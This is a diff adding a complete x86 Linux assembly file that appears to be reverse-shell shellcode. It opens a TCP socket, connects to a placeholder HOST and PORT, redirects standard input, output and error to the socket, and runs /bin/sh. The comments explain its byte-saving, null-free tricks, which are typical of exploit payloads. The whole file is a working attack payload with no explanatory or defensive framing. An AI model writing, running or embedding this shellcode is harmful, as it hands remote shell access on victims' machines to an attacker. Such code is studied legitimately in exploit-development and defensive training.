@@ -1,0 +1,48 @@
+global _start
+
+section .text
+_start:
+	xor eax, eax
+	cdq			; set edx to zero as well, by sign extending eax
+
+	mov ax, 0x167		; use mov instead of push imm16 and pop r16
+	; int socket(int, int, int)
+	push 0x2		; PF_INET
+	pop ebx			; domain
+	push 0x1		; SOCK_STREAM
+	pop ecx			; type
+	; edx (protocol) initialized to zero by the cdq instruction above
+	int 0x80
+
+	xchg ebx, eax		; fd on ebx from this point below
+	mov ax, 0x16a		; use mov instead of push imm16 and pop r16
+	; int connect(int, const struct sockaddr *, socklen_t)
+	push HOST		; host in network byte order
+	push word PORT		; port in network byte order
+	push word 0x2		; AF_INET
+	mov ecx, esp		; addr
+	push 0x10		; 16 bytes in total
+	pop edx			; addrlen
+	int 0x80
+
+	push 0x2
+	pop ecx			; newfd
+bind_dup2_loop:
+	push 0x3f
+	; int dup2(int, int)
+	pop eax	
+	int 0x80
+	dec ecx
+	jns bind_dup2_loop	; don't jump if ecx is positive
+
+	cdq			; eax is zero from the dup2(2) above (stdin fd)
+	push eax		; to null terminate the filename
+	push 0xb
+	; int execve(const char *, char *const [], char *const [])
+	pop eax
+	push 0x68732f6e		; n/sh
+	push 0x69622f2f		; //bi
+	mov ebx, esp		; filename
+	inc ecx			; ecx (argv) is 0xffffffff from the above dup(2)
+	; edx is already zero
+	int 0x80
